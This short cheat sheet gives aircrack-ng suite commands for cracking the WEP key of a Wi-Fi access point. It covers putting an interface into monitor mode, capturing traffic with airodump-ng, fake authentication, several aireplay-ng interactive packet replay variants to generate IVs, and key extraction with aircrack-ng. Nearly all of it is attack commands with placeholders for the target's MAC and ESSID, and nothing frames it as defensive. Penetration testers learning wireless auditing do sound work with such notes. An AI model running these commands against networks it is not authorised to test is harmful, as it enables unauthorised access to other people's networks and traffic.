 **Start Interface** 
 ```bash
airmon-ng start <interface> <AP channel>  
```
  
**Start Dump Capture**  
```bash
airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface> 
```
  
  
**Fake Authenticate to AP**  
```bash
aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface>  
```

**OR**  

```bash
aireplay-ng -1 6000 -o 1 -q 10 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface>  
```
  
**Launch Interactive Packet Replay Attack**  
```bash
aireplay-ng -2 -b <AP MAC> -d FF:FF:FF:FF:FF:FF -t 1 <interface>  
```

**OR**  

```bash
aireplay-ng -2 -b <AP MAC> -t 1 -c FF:FF:FF:FF:FF:FF -p 0841 <interface>  
```

**OR**  

```bash
aireplay-ng -2 -b <AP MAC> -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 <interface>  
```
  
**Extract Key from Capture after enough IVs have been generated**  
```bash
aircrack-ng <capture>
```